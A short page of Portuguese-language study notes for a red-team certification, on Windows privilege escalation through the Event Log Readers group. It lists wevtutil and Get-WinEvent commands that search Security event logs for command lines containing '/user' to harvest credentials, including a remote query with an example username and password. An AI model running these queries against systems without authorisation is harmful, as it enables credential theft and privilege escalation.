> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/event-log-readers.md).

# Event Log Readers

* **Pesquisando logs de segurança usando o wevtutil**

```ps
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

* **Passando credenciais para wevtutil**

```powershell
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

* **Pesquisando logs de segurança usando Get-WinEvent**

```ps
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
